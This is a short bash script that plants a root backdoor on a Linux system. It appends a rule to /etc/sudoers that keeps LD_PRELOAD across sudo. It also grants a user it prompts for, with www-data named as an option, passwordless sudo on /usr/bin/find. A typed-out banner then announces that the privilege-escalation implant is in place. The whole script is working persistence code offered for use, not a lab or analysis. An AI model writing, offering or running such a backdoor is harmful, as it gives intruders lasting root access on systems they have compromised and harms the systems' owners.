#!/bin/bash


# This script basically activate Privesc with LD_PRELOAD and add your user in /etc/sudoers, but if you want, you add www-data too.


addPreloadToPrivesc(){
	echo "Defaults    env_keep += LD_PRELOAD" >> /etc/sudoers
}

addUser(){
	read -p "Enter with your user or www-data: " user
	echo "$user (ALL : ALL) NOPASSWD: /usr/bin/find" >> /etc/sudoers
}

addPreloadToPrivesc && addUser /

clear

scs="[*] Success! LD_PRELOAD for Privesc has been implanted. [*]"

for i in $(seq 1 ${#scs}); do
        echo -ne "${scs:i-1:1}"
        sleep 0.05
done

echo -ne "\n"

clear
